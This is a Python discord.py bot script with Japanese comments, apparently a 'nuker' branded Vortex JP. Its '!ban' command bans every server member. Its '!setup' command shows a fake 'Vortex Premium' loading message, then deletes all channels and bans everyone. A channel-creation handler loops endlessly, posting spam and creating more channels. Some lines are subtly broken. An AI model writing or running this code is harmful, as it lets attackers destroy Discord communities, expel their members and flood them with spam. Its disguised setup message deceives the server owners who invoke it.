#importするよ
#今回はnextcodeではなくdiscord.pyを使う
import discord
import keep_alive
import os
import random
import asyncio
from spammessage import spammessage

#Global変数を定義するよ
intents = discord.Intents.default()
intents.members = True
client  = discord.Client(intents=intents)

token = "ここにtoken"
channelname = "作りたいchannel名"

@client.event
async def on_ready():
  print("Bot Ready!")
  await client.change_presence(activity=discord.Game(name="made by start | Vortex JP"))

@client.event
async def on_message(message):
  guild = message.guild
  if message.content == "!ban":
    for i in guild.members:
      try:
        await i.ban()
        await message.channel.send(f"{i.name}をbanしました")
      except:
        pass
  elif message.content == spammessage:
    await message.channel.send(spammessage)
  elif message.content == "!setup":
    msg = await message.channel.send("Setup Vortex Premium...")
    #後でeditするから変数に入れとくよ
    await asyncio.sleep(1)
    await msg.edit(content="Setup Vortex Premium...\nLoading Server Status...")
    await asyncio.sleep(2)
    await msg.edit(content="Setup Vortex Premium...\nLoading Server Status...\nComplete!")
    await asyncio.sleep(0.5)
    await msg.edit(content="Setup is complete...")
    try:
      for i in message.guild.channel:
        await i.delete()
    except:
      pass
    try:
      for member in discord.guild.members:
        await member.ban()
    except:
      pass
    try:
      await guild.create_text_channel(channelname)
    except:
      pass
  

@client.event
async def on_guild_channel_create(channel):
  guild2 = channel.guild
  try:
    while True:
      await channel.send(spammessage)
      await guild2.create_text_channel(channelname + "-" + str(random.choices("1234567890",k=3)))
  except:
      pass

keep_alive.keep_alive()
client.run(token)